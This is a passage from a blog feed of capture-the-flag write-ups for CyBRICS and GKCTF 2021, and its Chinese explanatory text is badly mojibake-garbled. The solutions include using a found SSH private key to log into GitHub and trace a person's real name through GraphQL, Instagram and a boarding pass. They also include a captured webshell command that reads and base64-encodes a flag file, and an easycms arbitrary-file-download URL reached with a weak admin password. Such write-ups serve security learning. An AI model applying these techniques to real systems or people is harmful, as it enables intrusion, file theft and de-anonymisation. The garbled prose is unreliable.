class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>å°†è½½è·å‘é€åå¯å¾—åˆ°å¦‚ä¸‹å“åº”ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">..........................%@,...............%@,.......................+#@;?@@@@@@@@@@#..,?@@#*.....?@@@@@@%...?@@@@@@%...,?@@#*....*@@@@@@@#%:........?@;......:?#@@$+...,@@@@@@@@@;................,@*.....?@@@@@@%................:*$@@#%;......,*#@#*.....,*#@#*....*@@@@@@#?:...?@$:................................................................................................................................................................................................................................................</span><br><span class="line">..........................%@,...............%@,......................,@@@;?@@@@@@@@@@#.,#@@@@@%....$@@@@@@%...$@@@@@@%..,#@@@@@%...*@@@@@@@@@@:......:@@;.....?@@@@@@@%..,@@@@@@@@@:...............,$@*.....$@@@@@@%...............+@@@@@@@@?.....%@@@@@%....%@@@@@%...*@@@@@@@@@;..?@@$................................................................................................................................................................................................................................................</span><br><span class="line">..........................%@,........................................+@?,......#@,.....*@%:,;@@;...@#.........@#........*@%:,;@@;..*@*....,;$@$.....,#@@;....*@@*:,,+@@?........*@?...............,$@@*.....@#....................;@@%;,,:*@@+...;@#;,;#@;..;@#;,;#@;..*@*...,:%@@:..,#@................................................................................................................................................................................................................................................</span><br><span class="line">..........................%@,........................................*@;.......#@,.....#@,...+@*..,@%........,@%........#@,...+@*..*@*......,@@.....*@$@;...:@@;.....:@@,......:@$...............+@@$@*....,@%...................,@@*......;@$...%@;...;@%..%@;...;@%..*@*......%@%...?@,...............................................................................................................................................................................................................................................</span><br><span class="line">.......,?#@#*..*@+....,@%.%@,?@@%:...%#:#@%.%@,..,?#@#*....*#@@$;....*@;.......#@,...........*@+..;@*........;@*..............*@+..*@*......,@@....:@??@;...?@?.......?%:......$@;...............##;;@*....;@*...................+@$........?*...@@.....@@..@@.....@@..*@*......,@@...?@,...............................................................................................................................................................................................................................................</span><br><span class="line">......,#@@@@@?.,@$....*@;.%@%@@@@@:..%##@@?.%@,.,#@@@@@?..?@@@@@@;...*@:.......#@,.........,+@#,..*@*%@@%:...*@*%@@%:.......,+@#,..*@*....,;$@%....$#,?@;...$@:...............+@%................;..;@*....*@*%@@%:..............%@+............,@$.....$@,,@$.....$@,.*@*.......$@:..?@:...............................................................................................................................................................................................................................................</span><br><span class="line">......?@$;,;#@:.$@,...$@..%@@+,:$@%..%@#:...%@,.?@$;,;#@:,@#:,,+@$...?@:.......#@,........?@@#:...?@@@@@@@:..?@@@@@@@:.....?@@#:...*@@@@@@@@@@:...*@;.?@;...@@,...............#@:...................;@*....?@@@@@@@:.............#@,............,@%.....%@:,@%.....%@:.*@*.......%@;..*@;...............................................................................................................................................................................................................................................</span><br><span class="line">......@@,...;@*.+@*..,@?..%@+...,@@,.%@+....%@,.@@,...;@*,@#;.......;@#........#@,........?#@@#:..$@*,,:$@#..$@*,,:$@#.....?#@@#:..*@@@@@@@#?:...:@%..?@;...@@...............;@%....................;@*....$@*,,:$@#.............@@,....$@@@@@;.:@%.....%@::@%.....%@:.*@*.......?@+..:@$:..............................................................................................................................................................................................................................................</span><br><span class="line">.....:@$........,@#..*@;..%@,....%@;.%@:....%@,:@$........$@@@$*,..*@#:........#@,..........,?@$........,#@:.......,#@:......,?@$..*@*..,?@%,....$#,..?@;...#@,..............%@;....................;@*..........,#@:............#@,....$@@@@@;.:@%.....%@,:@%.....%@,.*@*.......%@;...+@@,.............................................................................................................................................................................................................................................</span><br><span class="line">.....:@%.........%@:.$#...%@.....?@;.%@,....%@,:@%........,%@@@@@+.*@$:........#@,............#@,........%@;........%@;........#@,.*@*....?@%...*@;...?@;...$@;.......:;,...,@#.....................;@*...........%@;............$@;........?@;.,@$.....$@,,@$.....$@,.*@*.......#@:...+@@,.............................................................................................................................................................................................................................................</span><br><span class="line">.....:@$.........;@*,@?...%@,....%@:.%@,....%@,:@$..........,+%#@@,.;@$........#@,............$@:........%@;........%@;........$@:.*@*....,#@*..$@@@@@@@@@:.*@?.......?@*...;@?.....................;@*...........%@;............+@%........?@;..@@.....@@..@@.....@@..*@*......,@@...,@#:..............................................................................................................................................................................................................................................</span><br><span class="line">......@@,...,@%...##*@:...%@;...,@@,.%@,....%@,.@@,...,@%.......$@:..%@,.......#@,....,@#....,@@,,@#....,@@,,@#....,@@,,@#....,@@,.*@*.....;@@:.$@@@@@@@@@:.:@@:.....;@@:...?@;.....................;@*...,@#....,@@,............,@@*.......%@;..%@;...;@%..%@;...;@%..*@*......%@?...+@;...............................................................................................................................................................................................................................................</span><br><span class="line">......%@$:,:$@+...*@@#....%@@;,:$@%..%@,....%@,.%@$:,:$@+:@$:,,;#@,..*@:.......#@,.....$@%:,;$@%..$@%:,;$@%..$@%:,;$@%..$@%:,;$@%..*@*......%@%.......?@;....?@@*:,:*@@?....$@,.....................;@*....$@%:,;$@%..............;@@%;,,:+#@@;..;@#;,;#@;..;@#;,;#@;..*@*...,;%@@:...?@:...............................................................................................................................................................................................................................................</span><br><span class="line">......,#@@@@@%....,@@*....%@%@@@@#,..%@,....%@,.,#@@@@@%..%@@@@@@?...*@;.......#@,.....:@@@@@@#,..:@@@@@@#,..:@@@@@@#,..:@@@@@@#,..*@*......,@@;......?@;.....%@@@@@@@%,....@@......................;@*....:@@@@@@#,...............+@@@@@@@@#;....%@@@@@%....%@@@@@%...*@@@@@@@@@;....?@,...............................................................................................................................................................................................................................................</span><br><span class="line">.......,?#@#?,.....#@:....%@,%@@%,...%@,....%@,..,?#@#?,..,*#@@$+....*@;.......#@,......:%@@#?,....:%@@#?,....:%@@#?,....:%@@#?,...*@*.......*@#,.....?@;......;%#@@$+......@#......................;@*.....:%@@#?,.................,*$@@#%+......,*#@#*,....,*#@#*,...*@@@@@@#?:.....?@,...............................................................................................................................................................................................................................................</span><br><span class="line">..................,@$................................................+@;..............................................................................................................................................................................................................?@,...............................................................................................................................................................................................................................................</span><br><span class="line">................,,%@+................................................;@?,............................................................................................................................................................................................................,#@................................................................................................................................................................................................................................................</span><br><span class="line">................#@@#.................................................,@@@;.........................................................................................................;@@@@@@@@@@@+....................;@@@@@@@@@@@+...................................................?@@%................................................................................................................................................................................................................................................</span><br><span class="line">................%@$,..................................................+#@;.........................................................................................................;@@@@@@@@@@@+....................;@@@@@@@@@@@+...................................................?@$,................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;T3553R4C7_15_G00D&#125;</span><br></pre></td></tr></table></figure><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h3><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)</p><p>We have got the home folder from a criminalâ€™s computer. Try to find his/her real name.</p><p>Flag format in uppercase: LASTNAME FIRSTNAME (ex: IVANOV IVAN)</p></blockquote><p>é™„ä»¶ä¸­æœ‰ä¸€ä»½ Bash historyã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git add *</span><br><span class="line">git commit -m &quot;instagram filter&quot;</span><br><span class="line">git push origin main</span><br><span class="line">rm *</span><br><span class="line">ls -la</span><br><span class="line">rm -rf .git</span><br></pre></td></tr></table></figure><p>.ssh æ–‡ä»¶å¤¹ä¸­è¿˜æœ‰ä¸€ä»½ç§é’¥ï¼Œå› æ­¤å°è¯•ä½¿ç”¨è¿™ä¸ªç§é’¥å»è¿æ¥ GitHubï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å“åº”ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi poggersdog12! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">Connection to github.com closed.</span><br></pre></td></tr></table></figure><p>å› æ­¤å¾—åˆ°äº†æ­¤äººçš„ GitHub ID <code>poggersdog12</code>ã€‚</p><blockquote><p><a href="https://gist.github.com/thewoolleyman/2294542455a8e673e0a844362e0b8bac#file-github-graphql-commits-by-ref">https://gist.github.com/thewoolleyman/2294542455a8e673e0a844362e0b8bac#file-github-graphql-commits-by-ref</a></p></blockquote><p>ä½¿ç”¨ä¸Šè¿°å‚è€ƒ GraphQL è¯­å¥ç•¥ä½œä¿®æ”¹å¯ä»¥æŸ¥å‡ºä¸€ä¸ª email <code>vividcoala@localhost.com</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627218434788759/be78679f4557c7b6405a3484302ebba51763e910.png"></p><p>æ ¹æ®å‰é¢çš„ commit ä¿¡æ¯å¯çŸ¥æœ‰ä¸€ä¸ª Instagramï¼Œå› æ­¤å°è¯•è®¿é—® vividcoala çš„ Instagramï¼Œåœ¨ filter ä¸­å¯ä»¥å‘ç°ä¸€å¼ æœºç¥¨ï¼Œä½¿ç”¨ Read My Boarding Pass æ‰«æå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627220136652090/57e3d4f7fcbae997691bb97380bb8c488abe4baf.png@550h_500w_1c"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIVOV NIKOLAI</span><br></pre></td></tr></table></figure><h3 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h3><blockquote><p>Author: Mikhail Driagunov (<a href="https://t.me/aethereternity">@aethereternity</a>)</p><p>Iâ€™ve found a strange <a href="https://cybrics.net/files/strange_recording.mrf">recording</a>.</p><p>What does it hide?</p></blockquote><p>ä½¿ç”¨ Macro Recorder æ‰“å¼€ MRF æ–‡ä»¶ã€‚å°†ç³»ç»Ÿçš„è¯­è¨€å’Œ Firefox çš„è¯­è¨€è°ƒæ•´ä¸ºè‹±è¯­ï¼Œæ­¤æ—¶çª—å£æ ‡é¢˜æ‰èƒ½è·Ÿè®°å½•ä¸­çš„å¯¹ç…§ä¸Šã€‚æŒ‰ç…§ Firefox çš„ä½ç½®å°†å¼€å§‹èœå•çš„ç£è´´æ‘†æ”¾å¥½ï¼Œå¹¶åœ¨ Firefox ä¸­æ„é€ ä¸€ä¸ª pastebin çš„é”å®šè®°å½•çš„é¡µé¢ã€‚</p><p>æ–°å»ºä¸€ä¸ªè®°å½•æŒ‰ç…§åŸæœ¬è®°å½•ä¸­çš„çª—å£å¤§å°è®¾ç½®ï¼Œç„¶åæ’­æ”¾è®°å½•ï¼Œæ­¤æ—¶å±å¹•é”®ç›˜çš„çª—å£å¤§å°å’Œä½ç½®å°†è¢«è°ƒæ•´åˆ°é¢„è®¾ä½ç½®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627225176205320/f60a62a924f01da0bc22d185dd42b998685db184.png"></p><p>å°†é¼ æ ‡çš„ç‚¹å‡»å…³æ‰ï¼Œæ’­æ”¾æä¾›çš„è®°å½•ï¼Œå°†ä¸¤éè™šæ‹Ÿé”®ç›˜çš„è®°å½•è·¯å¾„å¯¹åº”é”®ä½å¾—åˆ°è¾“å…¥å†…å®¹ã€‚è¡¥å……åå¯ä»¥å¾—åˆ°ä¸‹åˆ—å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com&#x2F;uzqCjFUa</span><br><span class="line">9yDz5iZprd</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¯†ç è§£å¯† Pastebin åå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;m4cr0_rulz_w000t&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>June GKCTF X DASCTFåº”æ€¥æŒ‘æˆ˜æ¯</title>
      <link href="/zh-CN/posts/751c0b7.html"/>
      <url>/zh-CN/posts/751c0b7.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="excel-éªšæ“ä½œ"><a href="#excel-éªšæ“ä½œ" class="headerlink" title="excel éªšæ“ä½œ"></a>excel éªšæ“ä½œ</h3><p>ä½¿ç”¨ Microsoft Excel æ‰“å¼€æ–‡ä»¶å¯ä»¥å‘ç°å…¶å®éƒ¨åˆ†å•å…ƒæ ¼ä¸­æœ‰ 1ï¼Œåœ¨æ–°çš„ Sheet ä¸­ä½¿ç”¨ <code>=IF(Sheet1!A2=1,1,0)</code> å°†å…¶æŠ„ä¸€ä»½ã€‚</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255239007.c4c0d376181685834a4f21ae6d6d5704273deafd.png"></p><p>åœ¨æ–°çš„ Sheet ä¸­å¯¹é•¿å®½éƒ½ä¸º 35 çš„åŒºåŸŸåº”ç”¨å…¬å¼ï¼Œå°†åˆ—å®½è°ƒä¸º 1.8 å¹¶åº”ç”¨å¦‚ä¸‹æ¡ä»¶æ ¼å¼è§„åˆ™ã€‚</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255348953.e5944fbc7f5e6553b6eb2e7f31f8ba675ef091de.png"></p><p>å¯ä»¥å‘ç°å•å…ƒæ ¼å¡«å……å‡ºäº†å¦‚ä¸‹æ±‰ä¿¡ç ã€‚</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255421861.71aaeb87c7e4605693b1430697b7bccec7aabce8.png@100w"></p><p>æ‰«ææ±‰ä¿¡ç å¯å¾—å¦‚ä¸‹åŒ…å« flag çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smsto:13511100000:flag&#123;9ee0cb62-f443-4a72-e9a3-43c0b910757e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9ee0cb62-f443-4a72-e9a3-43c0b910757e&#125;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>è·Ÿè¸ª TCP æµä¸€æŠŠæ¢­å¯ä»¥çœ‹åˆ°åŒ…å« <code>QER1=cat+%2Ff14g%7Cbase64</code> çš„ POST æµé‡ã€‚å°†å“åº”ä½¿ç”¨å¦‚ä¸‹ CyberChef Receipt å¤„ç†ï¼Œå¯ä»¥å¾—åˆ°å…³é”®ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#39;None&#39;)</span><br><span class="line">Strip_HTTP_headers()</span><br><span class="line">Gunzip()</span><br><span class="line">From_Hex(&#39;None&#39;)</span><br><span class="line">From_Base64(&#39;A-Za-z0-9+&#x2F;&#x3D;&#39;,true)</span><br><span class="line">Reverse(&#39;Character&#39;)</span><br><span class="line">From_Base64(&#39;A-Za-z0-9+&#x2F;&#x3D;&#39;,true)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CCCCC!!cc))[åˆ é™¤] [åˆ é™¤] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCC0 20:01:13</span><br><span class="line">[å›è½¦] [å›è½¦] [å›è½¦] ffllaagg&#123;&#123;&#125;&#125;WWeell-----------</span><br><span class="line">çª—å£:*new 52 - Notepad++</span><br><span class="line">æ—¶é—´:2021-03-301:13</span><br><span class="line">[å›è½¦] </span><br><span class="line">---------------------------------------------</span><br><span class="line">çª—å£:*new 52 - Notepad++</span><br><span class="line">æ—¶é—´:2021-03-30 20:###########</span><br><span class="line">--------------------------------------------21-03-30 20:01:08         #</span><br><span class="line">############################</span><br><span class="line"></span><br><span class="line">#######################################</span><br><span class="line">#         20</span><br></pre></td></tr></table></figure><p>ä»å…¶ä¸­å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_GkC4F_m1siCCCCCC!&#125;</span><br></pre></td></tr></table></figure><h3 id="ä½ çŸ¥é“apngå—"><a href="#ä½ çŸ¥é“apngå—" class="headerlink" title="ä½ çŸ¥é“apngå—"></a>ä½ çŸ¥é“apngå—</h3><p>ç”¨ Chrome æŸ¥çœ‹ apng åŠ¨å›¾å¯ä»¥å‘ç°æœ‰ä¸‰ä¸ªäºŒç»´ç ï¼Œå°†å…¶è½¬ä¸ºæ™®é€šçš„ GIF åä½¿ç”¨ Photoshop ç¨ä½œå¤„ç†åæ‰«æå¹¶å°†å†…å®¹æ‹¼åˆå³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3c7e4e5-9b9d-ad20-0327-288a235370ea&#125;</span><br></pre></td></tr></table></figure><h3 id="é“¶æå²›ã®å¥‡å¦™å†’é™©"><a href="#é“¶æå²›ã®å¥‡å¦™å†’é™©" class="headerlink" title="é“¶æå²›ã®å¥‡å¦™å†’é™©"></a>é“¶æå²›ã®å¥‡å¦™å†’é™©</h3><p>è§£å‹é™„ä»¶å¯å¾—ä¸€ä¸ª Minecraft å­˜æ¡£ï¼Œåœ¨ mods æ–‡ä»¶å¤¹ä¸­å¯ä»¥å‘ç°å…¶ä½¿ç”¨äº†åä¸º CustomNPCs_1.12.2-(05Jul20) çš„æ’ä»¶ã€‚æ‰¾åˆ°è¿™ä¸ªæ’ä»¶ä½äº <code>.minecraft\saves\Where is the flag\customnpcs\quests\ä¸»çº¿</code> çš„å­˜æ¡£ JSON æ–‡ä»¶ï¼Œåœ¨æ¯ä¸ªæ–‡ä»¶ä¸­å¯ä»¥è¯»åˆ° pages æ®µçš„å†…å®¹ï¼Œä»è€Œæ‹¼æ¥å‡º flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">w3lc0me_</span><br><span class="line">t0_9kctf_</span><br><span class="line">2021_</span><br><span class="line">Check_1n</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GKCTF&#123;w3lc0me_t0_9kctf_2021_Check_1n&#125;</span><br></pre></td></tr></table></figure><h3 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox Forensics"></a>FireFox Forensics</h3><p>è§£å‹é™„ä»¶å‘ç°æ˜¯ Firefox ä¿å­˜çš„ç™»å½•å‡­æ®ã€‚æŒ‰ç…§å®˜æ–¹çš„æŒ‡å¼•æ›¿æ¢æ–‡ä»¶å³å¯å°†åŠ å¯†çš„å‡­æ®æ¢å¤åˆ°æµè§ˆå™¨ä¸­ã€‚</p><blockquote><p><a href="https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile">https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626267391309.3439ffc654a48054407c53728fa1a30c8ddf0707.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;</span><br></pre></td></tr></table></figure><h3 id="0-03"><a href="#0-03" class="headerlink" title="0.03"></a>0.03</h3><p>ä½¿ç”¨ WinRAR è§£å‹é™„ä»¶åä½¿ç”¨ NTFS Streams åˆ†ç¦»æ–‡ä»¶æµã€‚</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626271869168.afa1a4238139e761be1bd04c24db2e6e38186626.png"></p><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼Œé…åˆè§£å‹å¾—åˆ°çš„ secret.txt å¯ä»¥è§£ä¸‰åˆ†å¯†ç ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QAZ WSX EDC</span><br><span class="line">RFV TGB YHN</span><br><span class="line">UJM IKO LP&#x2F;</span><br><span class="line">311223313313112122312312313311</span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626273942571.9ceaad526a54bcb6dbb79b32716051260df7379f.png"></p><p>è§£å‡ºä¸‰åˆ†å¯†ç åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EBCCAFDDCE</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šè¿°ä¿¡æ¯ä½œä¸ºå¯†ç æŒ‚è½½ Vera Crypt éšè—ç£ç›˜å¯å¾— flag æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85ec0e23-ebbe-4fa7-9c8c-e8b743d0d85c&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><blockquote><p>åå°å¯†ç 5ä½å¼±å£ä»¤</p></blockquote><p>æ ¹æ® hint å¯ä½¿ç”¨ <code>admin/12345</code> ä½œä¸ºè´¦å·å¯†ç ç™»å½• <code>/admin.php</code> çš„ç®¡ç†åå°ã€‚åå°çš„è‡ªå®šä¹‰ä¸»é¢˜å¤„å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ„é€ å‡ºå¦‚ä¸‹é“¾æ¥ä¸‹è½½åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b3a42f69-75d9-4871-a822-4f748b7879fe.node4.buuoj.cn&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L2ZsYWc&#x3D;</span><br></pre></td></tr></table></figure><p><code>L2ZsYWc=</code> å³ <code>/flag</code> Base64 Encode ä¸€æ¬¡çš„å†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;56d0914c-08c5-4af6-92b2-e31d2f947d5d&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>æ ¹æ®åå°ç‰ˆæœ¬å·ä¸‹è½½ä¸€ä»½ V7.7 çš„ CMS æºç ã€‚æ‰¾åˆ° <code>chanzhieps/system/module/ui/control.php</code> è¿™ä¸ªæ–‡ä»¶ä¸‹çš„ <code>downloadtheme</code> æ–¹æ³•ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626503466852/7c4c2c528234e46e9e22884bdcd7e4ee3d070e6e.png"></p><p>å¯ä»¥å¾ˆç›´æ¥åœ°çœ‹åˆ°è¿™é‡Œç›´æ¥é‡‡ç”¨ <code>file_get_contents</code> å°†æ–‡ä»¶è¯»å…¥åæ¨ç»™äº†ä¸‹è½½æµè€Œæ²¡åšä»»ä½•æ ¡éªŒï¼Œå› æ­¤è¾¾æˆäº†ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚</p><h3 id="CheckBot"><a href="#CheckBot" class="headerlink" 